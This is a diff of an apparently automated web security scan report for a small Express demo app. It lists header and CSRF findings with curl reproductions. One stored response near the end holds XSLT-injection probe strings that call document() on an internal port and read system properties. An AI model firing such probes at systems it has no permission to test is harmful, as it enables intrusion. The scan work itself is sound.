+        "content-type": "application/x-www-form-urlencoded",
+        "host": "host.docker.internal:3000",
+        "pragma": "no-cache",
+        "referer": "http://host.docker.internal:3000",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
+      }
+      ```
+    * **Body**:
+      ```json
+      "words=ZAP"
+      ```
+    * **Curl**:
+      ```shell
+      curl -o - -i \
+        -X POST \
+        --data 'words=ZAP' \
+        -H "cache-control: no-cache" \
+        -H "content-type: application/x-www-form-urlencoded" \
+        -H "host: host.docker.internal:3000" \
+        -H "pragma: no-cache" \
+        -H "referer: http://host.docker.internal:3000" \
+        -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
+        "http://host.docker.internal:3000/"
+      ```
+* **Response**
+    * **Status Code**: `200`
+    * **Headers**:
+      ```json
+      {
+        "Connection": "keep-alive",
+        "Content-Length": "332",
+        "Content-Type": "text/html; charset=utf-8",
+        "Date": "Mon, 24 Jul 2023 14:41:12 GMT",
+        "ETag": "W/\"14c-fjf1XHwM2xi+NHrTOyLheKdLc20\"",
+        "Keep-Alive": "timeout=5",
+        "X-Powered-By": "Express"
+      }
+      ```
+    * **Body**:
+      ```html
+      <!doctype html>
+      <html lang="en">
+      <body>
+      <a href="/search">Search</a>
+      <form method="post" action="/">
+        <label for="words">Enter some words</label>
+        <input name="words" id="words" />
+        <button type="submit">Submit</button>
+      </form>
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul><li>cake</li>
+      <li>cheese</li>
+      <li>ZAP</li></ul>
+      </body>
+      </html>
+      
+      ```
+
+</details>
 
 ##### References
 
@@ -993,16 +1186,16 @@ Content Security Policy (CSP) is an added layer of security that helps to detect
 The following examples were found in the application.
 
 
-**Example 1**
+<details><summary>Example 1</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/robots.txt`
+    * **Target**: `http://host.docker.internal:3000/robots.txt`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
       }
@@ -1012,10 +1205,10 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
-        "http://localhost:3000/robots.txt"
+        "http://host.docker.internal:3000/robots.txt"
       ```
 * **Response**
     * **Status Code**: `404`
@@ -1026,7 +1219,7 @@ The following examples were found in the application.
         "Content-Length": "149",
         "Content-Security-Policy": "default-src 'none'",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:57:56 GMT",
+        "Date": "Mon, 24 Jul 2023 14:41:12 GMT",
         "Keep-Alive": "timeout=5",
         "X-Content-Type-Options": "nosniff",
         "X-Powered-By": "Express"
@@ -1047,16 +1240,18 @@ The following examples were found in the application.
       
       ```
 
-**Example 2**
+</details>
+
+<details><summary>Example 2</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/sitemap.xml`
+    * **Target**: `http://host.docker.internal:3000/sitemap.xml`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
       }
@@ -1066,10 +1261,10 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
-        "http://localhost:3000/sitemap.xml"
+        "http://host.docker.internal:3000/sitemap.xml"
       ```
 * **Response**
     * **Status Code**: `404`
@@ -1080,7 +1275,7 @@ The following examples were found in the application.
         "Content-Length": "150",
         "Content-Security-Policy": "default-src 'none'",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:57:56 GMT",
+        "Date": "Mon, 24 Jul 2023 14:41:12 GMT",
         "Keep-Alive": "timeout=5",
         "X-Content-Type-Options": "nosniff",
         "X-Powered-By": "Express"
@@ -1100,6 +1295,8 @@ The following examples were found in the application.
       </html>
       
       ```
+
+</details>
 
 ##### References
 
@@ -1124,16 +1321,16 @@ CSRF has primarily been used to perform an action against a target site using th
 The following examples were found in the application.
 
 
-**Example 1**
+<details><summary>Example 1</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000`
+    * **Target**: `http://host.docker.internal:3000`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
       }
@@ -1143,10 +1340,10 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
-        "http://localhost:3000"
+        "http://host.docker.internal:3000"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -1154,10 +1351,10 @@ The following examples were found in the application.
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "302",
+        "Content-Length": "319",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:57:55 GMT",
-        "ETag": "W/\"12e-NUd9AXIUhKg/ZrG/vBaRj1swOp4\"",
+        "Date": "Mon, 24 Jul 2023 14:41:12 GMT",
+        "ETag": "W/\"13f-BqFz+9wjKcZgAGeRZ0Vy1TwWFEQ\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -1173,25 +1370,28 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
-      <ul><li>ZAP</li></ul>
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul><li>cake</li>
+      <li>cheese</li></ul>
       </body>
       </html>
       
       ```
 
-**Example 2**
+</details>
+
+<details><summary>Example 2</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/search`
+    * **Target**: `http://host.docker.internal:3000/search`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000",
+        "referer": "http://host.docker.internal:3000",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
       }
       ```
@@ -1200,11 +1400,11 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000" \
+        -H "referer: http://host.docker.internal:3000" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
-        "http://localhost:3000/search"
+        "http://host.docker.internal:3000/search"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -1214,8 +1414,8 @@ The following examples were found in the application.
         "Connection": "keep-alive",
         "Content-Length": "256",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:57:56 GMT",
-        "ETag": "W/\"100-Ez9kQ2LJQmBI+nK7DdgzrICKUBQ\"",
+        "Date": "Mon, 24 Jul 2023 14:41:12 GMT",
+        "ETag": "W/\"100-SGZlmK7zb5bMpHwyMfozWYtvlqo\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -1230,25 +1430,27 @@ The following examples were found in the application.
         <input name="q" id="q" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
+      e836fe8362e3626c6adbb03926fa58d9
       <p>You searched for: undefined</p>
       </body>
       </html>
       
       ```
 
-**Example 3**
+</details>
+
+<details><summary>Example 3</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/search?q=ZAP`
+    * **Target**: `http://host.docker.internal:3000/search?q=ZAP`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000/search",
+        "referer": "http://host.docker.internal:3000/search",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
       }
       ```
@@ -1257,11 +1459,11 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000/search" \
+        -H "referer: http://host.docker.internal:3000/search" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
-        "http://localhost:3000/search?q=ZAP"
+        "http://host.docker.internal:3000/search?q=ZAP"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -1271,8 +1473,8 @@ The following examples were found in the application.
         "Connection": "keep-alive",
         "Content-Length": "250",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:57:56 GMT",
-        "ETag": "W/\"fa-kPP1kQTdSUEonRkcNJnMUr19j8k\"",
+        "Date": "Mon, 24 Jul 2023 14:41:12 GMT",
+        "ETag": "W/\"fa-kXSJP4dZxJQvjvACiAps6iTP470\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -1287,17 +1489,19 @@ The following examples were found in the application.
         <input name="q" id="q" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
+      e836fe8362e3626c6adbb03926fa58d9
       <p>You searched for: ZAP</p>
       </body>
       </html>
       
       ```
 
-**Example 4**
+</details>
+
+<details><summary>Example 4</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/`
+    * **Target**: `http://host.docker.internal:3000/`
     * **Method**: `POST`
     * **Headers**:
       ```json
@@ -1305,9 +1509,9 @@ The following examples were found in the application.
         "cache-control": "no-cache",
         "content-length": "9",
         "content-type": "application/x-www-form-urlencoded",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000",
+        "referer": "http://host.docker.internal:3000",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
       }
       ```
@@ -1322,11 +1526,11 @@ The following examples were found in the application.
         --data 'words=ZAP' \
         -H "cache-control: no-cache" \
         -H "content-type: application/x-www-form-urlencoded" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000" \
+        -H "referer: http://host.docker.internal:3000" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
-        "http://localhost:3000/"
+        "http://host.docker.internal:3000/"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -1334,10 +1538,10 @@ The following examples were found in the application.
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "315",
+        "Content-Length": "332",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:57:56 GMT",
-        "ETag": "W/\"13b-a8pXFGhzT4FQ2yc6+5Z+5hrwsq0\"",
+        "Date": "Mon, 24 Jul 2023 14:41:12 GMT",
+        "ETag": "W/\"14c-fjf1XHwM2xi+NHrTOyLheKdLc20\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -1353,13 +1557,16 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
-      <ul><li>ZAP</li>
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul><li>cake</li>
+      <li>cheese</li>
       <li>ZAP</li></ul>
       </body>
       </html>
       
       ```
+
+</details>
 
 ##### References
 
@@ -1378,16 +1585,16 @@ The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. T
 The following examples were found in the application.
 
 
-**Example 1**
+<details><summary>Example 1</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000`
+    * **Target**: `http://host.docker.internal:3000`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
       }
@@ -1397,10 +1604,10 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
-        "http://localhost:3000"
+        "http://host.docker.internal:3000"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -1408,10 +1615,10 @@ The following examples were found in the application.
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "302",
+        "Content-Length": "319",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:57:55 GMT",
-        "ETag": "W/\"12e-NUd9AXIUhKg/ZrG/vBaRj1swOp4\"",
+        "Date": "Mon, 24 Jul 2023 14:41:12 GMT",
+        "ETag": "W/\"13f-BqFz+9wjKcZgAGeRZ0Vy1TwWFEQ\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -1427,25 +1634,28 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
-      <ul><li>ZAP</li></ul>
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul><li>cake</li>
+      <li>cheese</li></ul>
       </body>
       </html>
       
       ```
 
-**Example 2**
+</details>
+
+<details><summary>Example 2</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/search`
+    * **Target**: `http://host.docker.internal:3000/search`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000",
+        "referer": "http://host.docker.internal:3000",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
       }
       ```
@@ -1454,11 +1664,11 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000" \
+        -H "referer: http://host.docker.internal:3000" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
-        "http://localhost:3000/search"
+        "http://host.docker.internal:3000/search"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -1468,8 +1678,8 @@ The following examples were found in the application.
         "Connection": "keep-alive",
         "Content-Length": "256",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:57:56 GMT",
-        "ETag": "W/\"100-Ez9kQ2LJQmBI+nK7DdgzrICKUBQ\"",
+        "Date": "Mon, 24 Jul 2023 14:41:12 GMT",
+        "ETag": "W/\"100-SGZlmK7zb5bMpHwyMfozWYtvlqo\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -1484,25 +1694,27 @@ The following examples were found in the application.
         <input name="q" id="q" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
+      e836fe8362e3626c6adbb03926fa58d9
       <p>You searched for: undefined</p>
       </body>
       </html>
       
       ```
 
-**Example 3**
+</details>
+
+<details><summary>Example 3</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/search?q=ZAP`
+    * **Target**: `http://host.docker.internal:3000/search?q=ZAP`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000/search",
+        "referer": "http://host.docker.internal:3000/search",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
       }
       ```
@@ -1511,11 +1723,11 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000/search" \
+        -H "referer: http://host.docker.internal:3000/search" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
-        "http://localhost:3000/search?q=ZAP"
+        "http://host.docker.internal:3000/search?q=ZAP"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -1525,8 +1737,8 @@ The following examples were found in the application.
         "Connection": "keep-alive",
         "Content-Length": "250",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:57:56 GMT",
-        "ETag": "W/\"fa-kPP1kQTdSUEonRkcNJnMUr19j8k\"",
+        "Date": "Mon, 24 Jul 2023 14:41:12 GMT",
+        "ETag": "W/\"fa-kXSJP4dZxJQvjvACiAps6iTP470\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -1541,12 +1753,84 @@ The following examples were found in the application.
         <input name="q" id="q" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
+      e836fe8362e3626c6adbb03926fa58d9
       <p>You searched for: ZAP</p>
       </body>
       </html>
       
       ```
+
+</details>
+
+<details><summary>Example 4</summary>
+
+* **Request**
+    * **Target**: `http://host.docker.internal:3000/`
+    * **Method**: `POST`
+    * **Headers**:
+      ```json
+      {
+        "cache-control": "no-cache",
+        "content-length": "9",
+        "content-type": "application/x-www-form-urlencoded",
+        "host": "host.docker.internal:3000",
+        "pragma": "no-cache",
+        "referer": "http://host.docker.internal:3000",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
+      }
+      ```
+    * **Body**:
+      ```json
+      "words=ZAP"
+      ```
+    * **Curl**:
+      ```shell
+      curl -o - -i \
+        -X POST \
+        --data 'words=ZAP' \
+        -H "cache-control: no-cache" \
+        -H "content-type: application/x-www-form-urlencoded" \
+        -H "host: host.docker.internal:3000" \
+        -H "pragma: no-cache" \
+        -H "referer: http://host.docker.internal:3000" \
+        -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
+        "http://host.docker.internal:3000/"
+      ```
+* **Response**
+    * **Status Code**: `200`
+    * **Headers**:
+      ```json
+      {
+        "Connection": "keep-alive",
+        "Content-Length": "332",
+        "Content-Type": "text/html; charset=utf-8",
+        "Date": "Mon, 24 Jul 2023 14:41:12 GMT",
+        "ETag": "W/\"14c-fjf1XHwM2xi+NHrTOyLheKdLc20\"",
+        "Keep-Alive": "timeout=5",
+        "X-Powered-By": "Express"
+      }
+      ```
+    * **Body**:
+      ```html
+      <!doctype html>
+      <html lang="en">
+      <body>
+      <a href="/search">Search</a>
+      <form method="post" action="/">
+        <label for="words">Enter some words</label>
+        <input name="words" id="words" />
+        <button type="submit">Submit</button>
+      </form>
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul><li>cake</li>
+      <li>cheese</li>
+      <li>ZAP</li></ul>
+      </body>
+      </html>
+      
+      ```
+
+</details>
 
 ##### References
 
@@ -1563,16 +1847,16 @@ The web/application server is leaking information via one or more "X-Powered-By"
 The following examples were found in the application.
 
 
-**Example 1**
+<details><summary>Example 1</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000`
+    * **Target**: `http://host.docker.internal:3000`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
       }
@@ -1582,10 +1866,10 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
-        "http://localhost:3000"
+        "http://host.docker.internal:3000"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -1593,10 +1877,10 @@ The following examples were found in the application.
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "302",
+        "Content-Length": "319",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:57:55 GMT",
-        "ETag": "W/\"12e-NUd9AXIUhKg/ZrG/vBaRj1swOp4\"",
+        "Date": "Mon, 24 Jul 2023 14:41:12 GMT",
+        "ETag": "W/\"13f-BqFz+9wjKcZgAGeRZ0Vy1TwWFEQ\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -1612,25 +1896,27 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
-      <ul><li>ZAP</li></ul>
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul><li>cake</li>
+      <li>cheese</li></ul>
       </body>
       </html>
       
       ```
 
-**Example 2**
+</details>
+
+<details><summary>Example 2</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/search`
+    * **Target**: `http://host.docker.internal:3000/robots.txt`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
       }
       ```
@@ -1639,53 +1925,53 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
-        "http://localhost:3000/search"
+        "http://host.docker.internal:3000/robots.txt"
       ```
 * **Response**
-    * **Status Code**: `200`
+    * **Status Code**: `404`
     * **Headers**:
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "256",
+        "Content-Length": "149",
+        "Content-Security-Policy": "default-src 'none'",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:57:56 GMT",
-        "ETag": "W/\"100-Ez9kQ2LJQmBI+nK7DdgzrICKUBQ\"",
+        "Date": "Mon, 24 Jul 2023 14:41:12 GMT",
         "Keep-Alive": "timeout=5",
+        "X-Content-Type-Options": "nosniff",
         "X-Powered-By": "Express"
       }
       ```
     * **Body**:
-      ```html
-      <!doctype html>
+      ```json
+      <!DOCTYPE html>
       <html lang="en">
+      <head>
+      <meta charset="utf-8">
+      <title>Error</title>
+      </head>
       <body>
-      <form action="/search">
-        <label for="q">Search</label>
-        <input name="q" id="q" />
-        <button type="submit">Submit</button>
-      </form>
-      91982f77522dbe8334d889f270952f96
-      <p>You searched for: undefined</p>
+      <pre>Cannot GET /robots.txt</pre>
       </body>
       </html>
       
       ```
 
-**Example 3**
+</details>
+
+<details><summary>Example 3</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/sitemap.xml`
+    * **Target**: `http://host.docker.internal:3000/sitemap.xml`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
       }
@@ -1695,10 +1981,10 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" \
-        "http://localhost:3000/sitemap.xml"
+        "http://host.docker.internal:3000/sitemap.xml"
       ```
 * **Response**
     * **Status Code**: `404`
@@ -1709,7 +1995,7 @@ The following examples were found in the application.
         "Content-Length": "150",
         "Content-Security-Policy": "default-src 'none'",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:57:56 GMT",
+        "Date": "Mon, 24 Jul 2023 14:41:12 GMT",
         "Keep-Alive": "timeout=5",
         "X-Content-Type-Options": "nosniff",
         "X-Powered-By": "Express"
@@ -1730,6 +2016,8 @@ The following examples were found in the application.
       
       ```
 
+</details>
+
 ##### References
 
 [CWE-200](#CWE-200)
@@ -1747,16 +2035,16 @@ Check for differences in response based on fuzzed User Agent (eg. mobile sites, 
 The following examples were found in the application.
 
 
-**Example 1**
+<details><summary>Example 1</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000`
+    * **Target**: `http://host.docker.internal:3000`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
         "user-agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
       }
@@ -1766,10 +2054,10 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
         -H "user-agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" \
-        "http://localhost:3000"
+        "http://host.docker.internal:3000"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -1777,10 +2065,10 @@ The following examples were found in the application.
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "394",
+        "Content-Length": "531",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:58:09 GMT",
-        "ETag": "W/\"18a-HZTbdtbI9OY+wL8hP8z4SURZxdg\"",
+        "Date": "Mon, 24 Jul 2023 14:41:34 GMT",
+        "ETag": "W/\"213-1mZDED9sbTKOY6odiS+5bZq5RWU\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -1796,9 +2084,10 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
-      <ul><li><xsl:value-of select="document('http://localhost:22')"/></li>
-      <li>ZAP</li>
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul><li>"/><xsl:value-of select="system-property('xsl:vendor')"/><!--</li>
+      <li><xsl:value-of select="system-property('xsl:vendor')"/><!--</li>
+      <li><xsl:value-of select="document('http://host.docker.internal:22')"/></li>
       <li>ZAP</li>
       <li>ZAP</li></ul>
       </body>
@@ -1806,16 +2095,18 @@ The following examples were found in the application.
       
       ```
 
-**Example 2**
+</details>
+
+<details><summary>Example 2</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000`
+    * **Target**: `http://host.docker.internal:3000`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
